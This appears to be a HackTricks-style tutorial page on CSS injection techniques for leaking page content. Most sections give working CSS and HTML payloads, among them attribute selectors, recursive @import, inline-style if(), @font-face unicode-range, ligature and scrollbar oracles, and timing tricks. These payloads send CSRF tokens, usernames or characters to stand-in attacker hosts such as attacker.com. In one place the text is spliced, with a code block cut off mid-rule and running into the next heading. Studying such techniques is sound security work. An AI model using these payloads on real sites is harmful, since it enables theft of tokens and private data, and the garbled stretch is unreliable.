_body: "# CSS Injection\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## CSS Injection\n\n### LESS Code Injection\n\
  \nLESS is a popular CSS pre-processor that adds variables, mixins, functions and the powerful `@import` directive.  During\
  \ compilation the LESS engine will **fetch the resources referenced in `@import`** statements and embed (\"inline\") their\
  \ contents into the resulting CSS when the `(inline)` option is used.\n\n{{#ref}}\nless-code-injection.md\n{{/ref}}\n\n\
  ### Attribute Selector\n\nCSS selectors are crafted to match values of an `input` element's `name` and `value` attributes.\
  \ If the input element's value attribute starts with a specific character, a predefined external resource is loaded:\n\n\
  ```css\ninput[name=\"csrf\"][value^=\"a\"] {\n  background-image: url(https://attacker.com/exfil/a);\n}\ninput[name=\"csrf\"\
  ][value^=\"b\"] {\n  background-image: url(https://attacker.com/exfil/b);\n}\n/* ... */\ninput[name=\"csrf\"][value^=\"\
  9\"] {\n  background-image: url(https://attacker.com/exfil/9);\n}\n```\n\nHowever, this approach faces a limitation when\
  \ dealing with hidden input elements (`type=\"hidden\"`) because hidden elements do not load backgrounds.\n\n#### Bypass\
  \ for Hidden Elements\n\nTo circumvent this limitation, you can target a subsequent sibling element using the `~` general\
  \ sibling combinator. The CSS rule then applies to all siblings following the hidden input element, causing the background\
  \ image to load:\n\n```css\ninput[name=\"csrf\"][value^=\"csrF\"] ~ * {\n  background-image: url(https://attacker.com/exfil/csrF);\n\
  }\n```\n\nA practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).\n\
  \n#### Prerequisites for CSS Injection\n\nFor the CSS Injection technique to be effective, certain conditions must be met:\n\
  \n1. **Payload Length**: The CSS injection vector must support sufficiently long payloads to accommodate the crafted selectors.\n\
  2. **CSS Re-evaluation**: You should have the ability to frame the page, which is necessary to trigger the re-evaluation\
  \ of CSS with newly generated payloads.\n3. **External Resources**: The technique assumes the ability to use externally\
  \ hosted images. This might be restricted by the site's Content Security Policy (CSP).\n\n### Blind Attribute Selector\n\
  \nAs [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the\
  \ selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no\
  \ idea what is inside the web page loading the CSS injection.\\\nIt's also possible to use those selectors to extract information\
  \ from several block of the same type like in:\n\n```html\n<style>\n  html:has(input[name^=\"m\"]):not(input[name=\"mytoken\"\
  ]) {\n    background: url(/m);\n  }\n</style>\n<input name=\"mytoken\" value=\"1337\" />\n<input name=\"myname\" value=\"\
  gareth\" />\n```\n\nCombining this with the following **@import** technique, it's possible to exfiltrate a lot of **info\
  \ using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**\n\
  \n### @import\n\nThe previous technique has some drawbacks, check the prerequisites. You either need to be able to **send\
  \ multiple links to the victim**, or you need to be able to **iframe the CSS injection vulnerable page**.\n\nHowever, there\
  \ is another clever technique that uses **CSS `@import`** to improve the quality of the technique.\n\nThis was first showed\
  \ by [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) and it works like this:\n\nInstead of loading\
  \ the same page once and again with tens of different payloads each time (like in the previous one), we are going to **load\
  \ the page just once and just with an import to the attackers server** (this is the payload to send to the victim):\n\n\
  ```css\n@import url(\"//attacker.com:5001/start?\");\n```\n\n1. The import is going to **receive some CSS script** from\
  \ the attackers and the **browser will load it**.\n2. The first part of the CSS script the attacker will send is **another\
  \ `@import` to the attackers server again.**\n   1. The attackers server won't respond this request yet, as we want to leak\
  \ some chars and then respond this import with the payload to leak the next ones.\n3. The second and bigger part of the\
  \ payload is going to be an **attribute selector leakage payload**\n   1. This will send to the attackers server the **first\
  \ char of the secret and the last one**\n4. Once the attackers server has received the **first and last char of the secret**,\
  \ it will **respond the import requested in the step 2**.\n   1. The response is going to be exactly the same as the **steps\
  \ 2, 3 and 4**, but this time it will try to **find the second char of the secret and then penultimate**.\n\nThe attacker\
  \ will f**ollow that loop until it manages to leak completely the secret**.\n\nYou can find the original [**Pepe Vila's\
  \ code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the\
  \ [**same code but commented here**.](#css-injection)\n\n> [!TIP]\n> The script will try to discover 2 chars each time (from\
  \ the beginning and from the end) because the attribute selector allows to do things like:\n>\n> ```css\n> /* value^=  to\
  \ match the beggining of the value*/\n> input[value^=\"0\"] {\n>  --s0: url(http://localhost:5001/leak?pre=0);\n> }\n>\n\
  > /* value$=  to match the ending of the value*/\n> input[value$=\"f\"] {\n>  --e0: url(http://localhost:5001/leak?post=f);\n\
  > }\n> ```\n>\n> This allows the script to leak the secret faster.\n\n> [!WARNING]\n> Sometimes the script **doesn't detect\
  \ correctly that the prefix + suffix discovered is already the complete flag** and it will continue forwards (in the prefix)\
  \ and backwards (in the suffix) and at some point it will hang.\\\n> No worries, just check the **output** because **you\
  \ can see the flag there**.\n\n### Inline-Style CSS Exfiltration (attr() + if() + image-set())\n\nThis primitive enables\
  \ exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS\
  \ custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and\
  \ image-set() to trigger a network request that encodes the matched value.\n\n> [!WARNING]\n> Equality comparisons in if()\
  \ require double quotes for string literals. Single quotes will not match.\n\n- Sink: control an element's style attribute\
  \ and ensure the target attribute is on the same element (attr() reads only same-element attributes).\n- Read: copy the\
  \ attribute into a CSS variable: `--val: attr(title)`.\n- Decide: select a URL using nested conditionals comparing the variable\
  \ with string candidates: `--steal: if(style(--val:\"1\"): url(//attacker/1); else: url(//attacker/2))`.\n- Exfiltrate:\
  \ apply `background: image-set(var(--steal))` (or any fetching property) to force a request to the chosen endpoint.\n\n\
  Attempt (does not work; single quotes in comparison):\n\n```html\n<div style=\"--val:attr(title);--steal:if(style(--val:'1'):\
  \ url(/1); else: url(/2));background:image-set(var(--steal))\" title=1>test</div>\n```\n\nWorking payload (double quotes\
  \ required in the comparison):\n\n```html\n<div style='--val:attr(title);--steal:if(style(--val:\"1\"): url(/1); else: url(/2));background:image-set(var(--steal))'\
  \ title=1>test</div>\n```\n\nEnumerating attribute values with nested conditionals:\n\n```html\n<div style='--val: attr(data-uid);\
  \ --steal: if(style(--val:\"1\"): url(/1); else: if(style(--val:\"2\"): url(/2); else: if(style(--val:\"3\"): url(/3); else:\
  \ if(style(--val:\"4\"): url(/4); else: if(style(--val:\"5\"): url(/5); else: if(style(--val:\"6\"): url(/6); else: if(style(--val:\"\
  7\"): url(/7); else: if(style(--val:\"8\"): url(/8); else: if(style(--val:\"9\"): url(/9); else: url(/10)))))))))); background:\
  \ image-set(var(--steal));' data-uid='1'></div>\n```\n\nRealistic demo (probing usernames):\n\n```html\n<div style='--val:\
  \ attr(data-username); --steal: if(style(--val:\"martin\"): url(https://attacker.tld/martin); else: if(style(--val:\"zak\"\
  ): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username=\"\
  james\"></div>\n```\n\nNotes and limitations:\n\n- Works on Chromium-based browsers at the time of research; behavior may\
  \ differ on other engines.\n- Best suited for finite/enumerable value spaces (IDs, flags, short usernames). Stealing arbitrary\
  \ long strings without external stylesheets remains challenging.\n- Any CSS property that fetches a URL can be used to trigger\
  \ the request (e.g., background/image-set, border-image, list-style, cursor, content).\n\nAutomation: a Burp Custom Action\
  \ can generate nested inline-style payloads to brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda\n\
  \n### Other selectors\n\nOther ways to access DOM parts with **CSS selectors**:\n\n- **`.class-to-search:nth-child(2)`**:\
  \ This will search the second item with class \"class-to-search\" in the DOM.\n- **`:empty`** selector: Used for example\
  \ in [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**\n\n  ```css\n\
  \  [role^=\"img\"][aria-label=\"1\"]:empty {\n    background-image: url(\"YOUR_SERVER_URL?1\");\n  }\n  ```\n\n### Error\
  \ based XS-Search\n\n**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html),\
  \ [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)\n\nThe overall intention\
  \ is to **use a custom font from a controlled endpoint** and ensure that **text (in this case, 'A') is displayed with this\
  \ font only if the specified resource (`favicon.ico`) cannot be loaded**.\n\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n\
  \    <style>\n      @font-face {\n        font-family: poc;\n        src: url(http://attacker.com/?leak);\n        unicode-range:\
  \ U+0041;\n      }\n\n      #poc0 {\n        font-family: \"poc\";\n      }\n    </style>\n  </head>\n  <body>\n    <object\
  \ id=\"poc0\" data=\"http://192.168.0.1/favicon.ico\">A</object>\n  </body>\n</html>\n```\n\n1. **Custom Font Usage**:\n\
  \n   - A custom font is defined using the `@font-face` rule within a `<style>` tag in the `<head>` section.\n   - The font\
  \ is named `poc` and is fetched from an external endpoint (`http://attacker.com/?leak`).\n   - The `unicode-range` property\
  \ is set to `U+0041`, targeting the specific Unicode character 'A'.\n\n2. **Object Element with Fallback Text**:\n   - An\
  \ `<object>` element with `id=\"poc0\"` is created in the `<body>` section. This element tries to load a resource from `http://192.168.0.1/favicon.ico`.\n\
  \   - The `font-family` for this element is set to `'poc'`, as defined in the `<style>` section.\n   - If the resource (`favicon.ico`)\
  \ fails to load, the fallback content (the letter 'A') inside the `<object>` tag is displayed.\n   - The fallback content\
  \ ('A') will be rendered using the custom font `poc` if the external resource cannot be loaded.\n\n### Styling Scroll-to-Text\
  \ Fragment\n\nThe **`:target`** pseudo-class is employed to select an element targeted by a **URL fragment**, as specified\
  \ in the [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). It's crucial to\
  \ understand that `::target-text` doesn't match any elements unless the text is explicitly targeted by the fragment.\n\n\
  A security concern arises when attackers exploit the **Scroll-to-text** fragment feature, allowing them to confirm the presence\
  \ of specific text on a webpage by loading a resource from their server through HTML injection. The method involves injecting\
  \ a CSS rule like this:\n\n```css\n:target::before {\n  content: url(target.png);\n}\n```\n\nIn such scenarios, if the text\
  \ \"Administrator\" is present on the page, the resource `target.png` gets requested from the server, indicating the text's\
  \ presence. An instance of this attack can be executed through a specially crafted URL that embeds the injected CSS alongside\
  \ a Scroll-to-text fragment:\n\n```\nhttp://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator\n\
  ```\n\nHere, the attack manipulates HTML injection to transmit the CSS code, aiming at the specific text \"Administrator\"\
  \ through the Scroll-to-text fragment (`#:~:text=Administrator`). If the text is found, the indicated resource is loaded,\
  \ inadvertently signaling its presence to the attacker.\n\nFor mitigation, the following points should be noted:\n\n1. **Constrained\
  \ STTF Matching**: Scroll-to-text Fragment (STTF) is designed to match only words or sentences, thereby limiting its capability\
  \ to leak arbitrary secrets or tokens.\n2. **Restriction to Top-level Browsing Contexts**: STTF operates solely in top-level\
  \ browsing contexts and does not function within iframes, making any exploitation attempt more noticeable to the user.\n\
  3. **Necessity of User Activation**: STTF requires a user-activation gesture to operate, meaning exploitations are feasible\
  \ only through user-initiated navigations. This requirement considerably mitigates the risk of attacks being automated without\
  \ user interaction. Nevertheless, the blog post's author points out specific conditions and bypasses (e.g., social engineering,\
  \ interaction with prevalent browser extensions) that might ease the attack's automation.\n\nAwareness of these mechanisms\
  \ and potential vulnerabilities is key for maintaining web security and safeguarding against such exploitative tactics.\n\

  \n### @font-face / unicode-range <a href=\"#text-node-exfiltration-i-ligatures\" id=\"text-node-exfiltration-i-ligatures\"\
  ></a>\n\nYou can specify **external fonts for specific unicode values** that will only be **gathered if those unicode values\
  \ are present** in the page. For example:\n\n```html\n<style>\n  @font-face {\n    font-family: poc;\n    src: url(http://attacker.example.com/?A);\
  \ /* fetched */\n    unicode-range: U+0041;\n  }\n  @font-face {\n    font-family: poc;\n    src: url(http://attacker.example.com/?B);\
  \ /* fetched too */\n    unicode-range: U+0042;\n  }\n  @font-face {\n    font-family: poc;\n    src: url(http://attacker.example.com/?C);\
  \ /* not fetched */\n    unicode-range: U+0043;\n  }\n  #sensitive-information {\n    font-family: poc;\n  }\n</style>\n\
  \n<p id=\"sensitive-information\">AB</p>\nhtm\n```\n\nWhen you access this page, Chrome and Firefox fetch \"?A\" and \"\
  ?B\" because text node of sensitive-information contains \"A\" and \"B\" characters. But Chrome and Firefox do not fetch\
  \ \"?C\" because it does not contain \"C\". This means that we have been able to read \"A\" and \"B\".\n\n### Text node\
  \ exfiltration (I): ligatures <a href=\"#text-node-exfiltration-i-ligatures\" id=\"text-node-exfiltration-i-ligatures\"\
  ></a>\n\n**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)\n\
  \nThe technique described involves extracting text from a node by exploiting font ligatures and monitoring changes in width.\
  \ The process involves several steps:\n\n1. **Creation of Custom Fonts**:\n\n   - SVG fonts are crafted with glyphs having\
  \ a `horiz-adv-x` attribute, which sets a large width for a glyph representing a two-character sequence.\n   - Example SVG\
  \ glyph: `<glyph unicode=\"XY\" horiz-adv-x=\"8000\" d=\"M1 0z\"/>`, where \"XY\" denotes a two-character sequence.\n  \
  \ - These fonts are then converted to woff format using fontforge.\n\n2. **Detection of Width Changes**:\n\n   - CSS is\
  \ used to ensure that text does not wrap (`white-space: nowrap`) and to customize the scrollbar style.\n   - The appearance\
  \ of a horizontal scrollbar, styled distinctly, acts as an indicator (oracle) that a specific ligature, and hence a specific\
  \ character sequence, is present in the text.\n   - The CSS involved:\n     ```css\n     body {\n       white-space: nowrap;\n\
  \     }\n     body::-webkit-scrollbar {\n       background: blue;\n     }\n     body::-webkit-scrollbar:horizontal {\n \
  \      background: url(http://attacker.com/?leak);\n     }\n     ```\n\n3. **Exploit Process**:\n\n   - **Step 1**: Fonts\
  \ are created for pairs of characters with substantial width.\n   - **Step 2**: A scrollbar-based trick is employed to detect\
  \ when the large width glyph (ligature for a character pair) is rendered, indicating the presence of the character sequence.\n\
  \   - **Step 3**: Upon detecting a ligature, new glyphs representing three-character sequences are generated, incorporating\
  \ the detected pair and adding a preceding or succeeding character.\n   - **Step 4**: Detection of the three-character ligature\
  \ is carried out.\n   - **Step 5**: The process repeats, progressively revealing the entire text.\n\n4. **Optimization**:\n\
  \   - The current initialization method using `<meta refresh=...` is not optimal.\n   - A more efficient approach could\
  \ involve the CSS `@import` trick, enhancing the exploit's performance.\n\n### Text node exfiltration (II): leaking the\
  \ charset with a default font (not requiring external assets) <a href=\"#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"\
  \ id=\"text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"></a>\n\n**Reference:** [PoC using Comic Sans\
  \ by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)\n\nThis trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/).\
  \ The charset used in a text node can be leaked **using the default fonts** installed in the browser: no external -or custom-\
  \ fonts are needed.\n\nThe concept revolves around utilizing an animation to incrementally expand a `div`'s width, allowing\
  \ one character at a time to transition from the 'suffix' part of the text to the 'prefix' part. This process effectively\
  \ splits the text into two sections:\n\n1. **Prefix**: The initial line.\n2. **Suffix**: The subsequent line(s).\n\nThe\
  \ transition stages of the characters would appear as follows:\n\n**C**\\\nADB\n\n**CA**\\\nDB\n\n**CAD**\\\nB\n\n**CADB**\n\
  \nDuring this transition, the **unicode-range trick** is employed to identify each new character as it joins the prefix.\
  \ This is achieved by switching the font to Comic Sans, which is notably taller than the default font, consequently triggering\
  \ a vertical scrollbar. This scrollbar's appearance indirectly reveals the presence of a new character in the prefix.\n\n\
  Although this method allows the detection of unique characters as they appear, it does not specify which character is repeated,\
  \ only that a repetition has occurred.\n\n> [!TIP]\n> Basically, the **unicode-range is used to detect a char**, but as\
  \ we don't want to load an external font, we need to find another way.\\\n> When the **char** is **found**, it's **given**\
  \ the pre-installed **Comic Sans font**, which **makes** the char **bigger** and **triggers a scroll bar** which will **leak\
  \ the found char**.\n\nCheck the code extracted from the PoC:\n\n```css\n/* comic sans is high (lol) and causes a vertical\
  \ overflow */\n@font-face {\n  font-family: has_A;\n  src: local(\"Comic Sans MS\");\n  unicode-range: U+41;\n  font-style:\

  \ by hiding elements (not requiring external assets) <a href=\"#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"\
  \ id=\"text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"></a>\n\n**Reference:** This is mentioned as [an\
  \ unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)\n\nThis\
  \ case is very similar to the previous one, however, in this case the goal of making specific **chars bigger than other\
  \ is to hide something** like a button to not be pressed by the bot or a image that won't be loaded. So we could measure\
  \ the action (or lack of the action) and know if a specific char is present inside the text.\n\n### Text node exfiltration\
  \ (III): leaking the charset by cache timing (not requiring external assets) <a href=\"#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"\
  \ id=\"text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"></a>\n\n**Reference:** This is mentioned as [an\
  \ unsuccessful solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)\n\nIn this\
  \ case, we could try to leak if a char is in the text by loading a fake font from the same origin:\n\n```css\n@font-face\
  \ {\n  font-family: \"A1\";\n  src: url(/static/bootstrap.min.css?q=1);\n  unicode-range: U+0041;\n}\n```\n\nIf there is\
  \ a match, the **font will be loaded from `/static/bootstrap.min.css?q=1`**. Although it won’t load successfully, the **browser\
  \ should cache it**, and even if there is no cache, there is a **304 not modified** mechanism, so the **response should\
  \ be faster** than other things.\n\nHowever, if the time difference of the cached response from the non-cached one isn't\
  \ big enough, this won't be useful. For example, the author mentioned: However, after testing, I found that the first problem\
  \ is that the speed is not much different, and the second problem is that the bot uses the `disk-cache-size=1` flag, which\
  \ is really thoughtful.\n\n### Text node exfiltration (III): leaking the charset by timing loading hundreds of local \"\
  fonts\" (not requiring external assets) <a href=\"#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\" id=\"\
  text-node-exfiltration-ii-leaking-the-charset-with-a-default-font\"></a>\n\n**Reference:** This is mentioned as [an unsuccessful\
  \ solution in this writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)\n\nIn this case you\
  \ can indicate **CSS to load hundreds of fake fonts** from the same origin when a match occurs. This way you can **measure\
  \ the time** it takes and find out if a char appears or not with something like:\n\n```css\n@font-face {\n  font-family:\
  \ \"A1\";\n  src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),\n    .... url(/static/bootstrap.min.css?q=500);\n\
  \  unicode-range: U+0041;\n}\n```\n\nAnd the bot’s code looks like this:\n\n```python\nbrowser.get(url)\nWebDriverWait(browser,\
  \ 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')\ntime.sleep(30)\n```\n\nSo, if the font\
  \ does not match, the response time when visiting the bot is expected to be approximately 30 seconds. However, if there\
  \ is a font match, multiple requests will be sent to retrieve the font, causing the network to have continuous activity.\
  \ As a result, it will take longer to satisfy the stop condition and receive the response. Therefore, the response time\
  \ can be used as an indicator to determine if there is a font match.\n\n## References\n\n- [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)\n\
